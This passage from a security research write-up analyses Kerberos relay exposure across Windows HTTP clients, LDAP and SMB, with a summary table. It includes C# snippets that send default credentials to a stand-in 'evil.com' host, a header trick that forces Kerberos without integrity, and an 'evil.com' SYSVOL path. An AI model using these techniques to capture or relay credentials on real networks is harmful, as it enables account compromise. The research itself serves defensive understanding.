authenticate to non-dotted host names.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;If authentication is enabled it works with both local DNS resolving and public DNS as it does a second DNS lookup when constructing the SPN for &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://searchfox.org/mozilla-central/source/extensions/auth/nsAuthSSPI.cpp#93"&gt;nsAuthSSPI::MakeSN&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;. Unlike Chromium there doesn&amp;#39;t seem to be a setting to disable this behavior.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Once again I couldn&amp;#39;t get Firefox to use raw Kerberos, so Integrity is enabled. Also Delegation is not enabled unless an administrator configures the &lt;/span&gt;&lt;span class="c4"&gt;network.negotiate-auth.delegation-uris&lt;/span&gt;&lt;span&gt;&amp;nbsp;setting.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.hj80sqr0xa9u"&gt;&lt;span class="c31"&gt;.NET Framework 4.8&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span&gt;The .NET Framework 4.8 officially has two HTTP libraries, the original &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webrequest"&gt;System.Net.HttpWebRequest&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and derived APIs and the newer &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient"&gt;System.Net.Http.HttpClient&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;API. However in the .NET framework the newer API uses the older one under the hood, so we&amp;#39;ll only consider the older of the two.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Windows authentication is only generated automatically if the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest.usedefaultcredentials"&gt;UseDefaultCredentials&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;property is set to true on the &lt;/span&gt;&lt;span class="c4"&gt;HttpWebRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;object as shown below &lt;/span&gt;&lt;span&gt;(technically this sets the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.credentialcache.defaultcredentials"&gt;CredentialCache.DefaultCredentials&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;object, but it&amp;#39;s easier to use the boolean property). Once the default credentials are set the client will automatically authenticate using Windows authentication to any host, it doesn&amp;#39;t seem to care if that host is in the Intranet zone.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7e4822d1f02afd7da5d70f6bb7cc98084373024a"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;request = WebRequest.CreateHttp(&lt;/span&gt;&lt;span class="c2 c36"&gt;&amp;quot;http://www.evil.com&amp;quot;&lt;/span&gt;&lt;span class="c6 c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;request.UseDefaultCredentials = &lt;/span&gt;&lt;span class="c2 c13"&gt;true&lt;/span&gt;&lt;span class="c6 c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;response = (HttpWebResponse)request.GetResponse();&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The SPN is generated in the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://referencesource.microsoft.com/#System/net/System/Net/_AuthenticationState.cs,114"&gt;System.Net.AuthenticationState.GetComputeSpn&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function which we can find in the .NET reference source. The SPN is built from the canonical name returned by the initial DNS lookup, which means it supports the local but not public DNS resolution. If you follow the code it does support doing a second DNS lookup if the host is undotted, however this is only if the client code sets an explicit &lt;/span&gt;&lt;span class="c4"&gt;Host &lt;/span&gt;&lt;span class="c3"&gt;header as far as I can tell. Note that the code here is slightly different in .NET 2.0 which might support looking up the canonical name as long as the host name is undotted, but I&amp;#39;ve not verified that.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The .NET Framework supports specifying &lt;/span&gt;&lt;span class="c4"&gt;Kerberos&lt;/span&gt;&lt;span&gt;&amp;nbsp;directly as the authentication type in the &lt;/span&gt;&lt;span class="c4"&gt;WWW-Authentication&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;header. As the client code doesn&amp;#39;t explicitly request integrity, this allows the Kerberos AP_REQ to not have Integrity enabled. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The code also supports the &lt;/span&gt;&lt;span class="c4"&gt;WWW-Authentication&lt;/span&gt;&lt;span&gt;&amp;nbsp;header having an initial token, so even if Kerberos wasn&amp;#39;t directly supported, you could use &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and specify the stub token I described at the start to force Kerberos authentication. For example returning the following header with the initial 401 status response will force &lt;/span&gt;&lt;span class="c4"&gt;Kerberos &lt;/span&gt;&lt;span class="c3"&gt;through auto-detection:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.47f2d775b3f960ad13600d96e3bddd754ab896ed"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;WWW-Authenticate: Negotiate AAFA&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Finally, the authentication code always enables delegation regardless of the target host.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.55txgo3a2wq5"&gt;&lt;span class="c31"&gt;.NET 5.0&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span&gt;The .NET 5.0 runtime has deprecated the &lt;/span&gt;&lt;span class="c4"&gt;HttpWebRequest&lt;/span&gt;&lt;span&gt;&amp;nbsp;API in favor of the &lt;/span&gt;&lt;span class="c4"&gt;HttpClient&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. It uses a new backend class called the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.socketshttphandler"&gt;SocketsHttpHandler&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. As it&amp;#39;s all open source we can find the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/dotnet/runtime/blob/791a0d896052f61161aff4c1ccb5f3425328f9a8/src/libraries/System.Net.Http/src/System/Net/Http/SocketsHttpHandler/AuthenticationHelper.NtAuth.cs"&gt;implementation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, specifically the &lt;/span&gt;&lt;span class="c4"&gt;AuthenticationHelper &lt;/span&gt;&lt;span class="c3"&gt;class which is a complete rewrite from the .NET Framework version.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;To automatically authenticate, the client code must either use the &lt;/span&gt;&lt;span class="c4"&gt;HttpClientHandler &lt;/span&gt;&lt;span&gt;class and set the &lt;/span&gt;&lt;span class="c4"&gt;UseDefaultCredentials &lt;/span&gt;&lt;span&gt;property as shown below. Or if using &lt;/span&gt;&lt;span class="c4"&gt;SocketsHttpHandler&lt;/span&gt;&lt;span&gt;, set the &lt;/span&gt;&lt;span class="c4"&gt;Credentials &lt;/span&gt;&lt;span&gt;property to the default credentials. This handler must then be specified when creating the &lt;/span&gt;&lt;span class="c4"&gt;HttpClient &lt;/span&gt;&lt;span class="c3"&gt;object.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.558674b491818f584c342a8a8dd3989575c4c999"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;handler = &lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;HttpClientHandler();&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;handler.UseDefaultCredentials = &lt;/span&gt;&lt;span class="c2 c13"&gt;true&lt;/span&gt;&lt;span class="c6 c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;client = &lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;HttpClient(handler);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;await&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;client.GetStringAsync(&lt;/span&gt;&lt;span class="c2 c36"&gt;&amp;quot;http://www.evil.com&amp;quot;&lt;/span&gt;&lt;span class="c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Unless the client specified an explicit &lt;/span&gt;&lt;span class="c4"&gt;Host &lt;/span&gt;&lt;span class="c3"&gt;header in the request the authentication will do a DNS lookup for the canonical name. This is separate from the DNS lookup for the HTTP connection so it supports both local and public DNS attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;While the implementation doesn&amp;#39;t support Kerberos directly like the .NET Framework, it does support passing an initial token so it&amp;#39;s still possible to force raw Kerberos which will disable the Integrity requirement.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.9k5bin8hhfky"&gt;&lt;span class="c31"&gt;.NET 6.0&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span&gt;The .NET 6.0 runtime is basically the same as .NET 5.0, except that Integrity is specified explicitly when creating the client authentication context. This means that rolling back to Kerberos no longer has any advantage. &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/dotnet/runtime/commit/17481fef502ee6aed6f9e8fc76e45bb5863c68b5"&gt;This change&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;seems to be down to a broken implementation of NTLM on macOS and not as some anti-NTLM relay measure.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.liq0ng1hwkl2"&gt;&lt;span class="c31"&gt;HTTP Overview&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The following table summarizes the results of the HTTP protocol research:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c24 lst-kix_2yktnm17nyl7-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c4"&gt;LLMNR &lt;/span&gt;&lt;span&gt;column &lt;/span&gt;&lt;span class="c3"&gt;indicates it&amp;#39;s possible to influence the SPN using a local DNS resolver attack &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c4"&gt;DNS CNAME&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;indicates a public DNS resolving attack &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c4"&gt;Delegation &lt;/span&gt;&lt;span class="c3"&gt;indicates the HTTP user agent enables Kerberos delegation &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c4"&gt;Integrity &lt;/span&gt;&lt;span class="c3"&gt;indicates that integrity protection is requested which reduces the usefulness of the relayed authentication if the target server automatically detects the setting.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.6768360573c54e4f01434a9fa509149b13842614"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c21"&gt;&lt;tbody&gt;&lt;tr class="c20"&gt;&lt;td class="c15 c33" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c25 c14 c4"&gt;User Agent&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29 c33" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c25 c14 c4"&gt;LLMNR&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30 c33" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c25 c14 c4"&gt;DNS CNAME&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10 c33" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c25 c14 c4"&gt;Delegation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22 c33" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;Integrity&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Internet Explorer 11 (WinINET)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;WebDAV (WinHTTP)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Chromium (M93)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span&gt;No&lt;/span&gt;&lt;span class="c25 c38"&gt;&amp;dagger;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Firefox 91&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span&gt;No&lt;/span&gt;&lt;span class="c41"&gt;&amp;dagger;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;.NET Framework 4.8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span&gt;No&lt;/span&gt;&lt;span class="c38 c25"&gt;&amp;Dagger;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;.NET 5.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c20"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;.NET 6.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c29" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c22" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;dagger; Chromium and Firefox can enable delegation only on a per-site basis through a GPO.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;&amp;Dagger; .NET Framework supports DNS resolving in special circumstances for non-dotted hostnames.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;By far the most permissive client is .NET 5.0. It supports authenticating to any host as long as it has been configured to authenticate automatically. It also supports arbitrary SPN spoofing from a public DNS name as well as disabling integrity through Kerberos fallback. However, as .NET 5.0 is designed to be something usable cross platform, it&amp;#39;s possible that few libraries written with it in mind will ever enable automatic authentication.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.ip4rfjjchenz"&gt;&lt;span class="c6 c19"&gt;LDAP&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;Windows has a built-in general purpose LDAP library in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/_ldap/"&gt;wldap32.dll&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This is used by the majority of OS components when accessing Active Directory and is also used by the .NET &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection"&gt;LdapConnection&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;class. There doesn&amp;#39;t seem to be a way of specifying the SPN manually for the LDAP connection using the API. Instead it&amp;#39;s built manually based on the canonical name based on the DNS lookup. Therefore it&amp;#39;s exploitable in a similar manner to &lt;/span&gt;&lt;span&gt;WinINET&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;via local DNS resolution.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The name of the LDAP server can also be found by querying for a SRV record for the hostname. This is used to support accessing the LDAP server from the top-level Windows domain name. This will usually return an address record alongside, all this does is change the server resolution process which doesn&amp;#39;t seem to give any advantages to exploitation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Whether the LDAP client enables integrity checking is based on the value of the &lt;/span&gt;&lt;span class="c4"&gt;LDAP_OPT_SIGN&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag. As the connection only supports &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;authentication the client passes the &lt;/span&gt;&lt;span class="c4"&gt;ISC_REQ_NO_INTEGRITY&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;flag if signing is disabled so that the server won&amp;#39;t accidentally auto-detect the signing capability enabled for the Negotiate MIC and accidentally enable signing protection.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;As part of &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a"&gt;recent changes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to LDAP signing the client is forced to enable Integrity by the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-ldap-client-signing-requirements"&gt;LdapClientIntegrity policy&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This means that regardless of whether the LDAP server needs integrity protection it&amp;#39;ll be enabled on the client which in turn will automatically enable it on the server. Changing the value of &lt;/span&gt;&lt;span class="c4"&gt;LDAP_OPT_SIGN&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;in the client has no effect once this policy is enabled.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.m3ajz9uje54l"&gt;&lt;span class="c6 c19"&gt;SMB&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;SMB is one of the most commonly exploited protocols for NTLM relay, as it&amp;#39;s easy to convert access to a file into authentication. It would be convenient if it was also exploitable for Kerberos relay. While SMBv1 is deprecated and not even installed on newer installs of Windows, it&amp;#39;s still worth looking at the implementation of v1 and v2 to determine if either are exploitable.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The client implementations of SMB 1 and 2 are in &lt;/span&gt;&lt;span class="c4"&gt;mrxsmb10.sys&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;mrxsmb20.sys&lt;/span&gt;&lt;span&gt;&amp;nbsp;respectively with some common code in &lt;/span&gt;&lt;span class="c4"&gt;mrxsmb.sys&lt;/span&gt;&lt;span&gt;. Both protocols support specifying a name for the SPN which is related to DFS. The SPN name needs to be specified through the &lt;/span&gt;&lt;span class="c4"&gt;GUID_ECP_DOMAIN_SERVICE_NAME_CONTEXT&lt;/span&gt;&lt;span&gt;&amp;nbsp;ECP and is only enabled if the &lt;/span&gt;&lt;span class="c4"&gt;NETWORK_OPEN_ECP_OUT_FLAG_RET_MUTUAL_AUTH &lt;/span&gt;&lt;span&gt;flag in the &lt;/span&gt;&lt;span class="c4"&gt;GUID_ECP_NETWORK_OPEN_CONTEXT &lt;/span&gt;&lt;span class="c3"&gt;ECP (set by MUP) is specified. This is related to UNC hardening which was added to protect things like group policies.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;It&amp;#39;s easy enough to trigger the conditions to set the &lt;/span&gt;&lt;span class="c4"&gt;NETWORK_OPEN_ECP_OUT_FLAG_RET_MUTUAL_AUTH&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag. The default UNC hardening rules always add SYSVOL and NETLOGON UNC paths with a wildcard hostname. Therefore a request to &lt;/span&gt;&lt;span class="c4"&gt;\\evil.com\SYSVOL&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;will cause the flag to be set and the SPN potentially overridable. The server should be a DFS server for this to work, however even with the flag set I&amp;#39;ve not found a way of setting an arbitrary SPN value remotely.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Even if you could spoof the SPN, the SMB clients always enable Integrity protection. Like LDAP, SMB will enable signing and encryption opportunistically if available from the client, unless UNC hardening measures are in place.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.kia6c4byjbr3"&gt;&lt;span class="c6 c19"&gt;Marshaled Target Information SPN&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;While investigating the SMB implementation I noticed something interesting. The SMB clients use 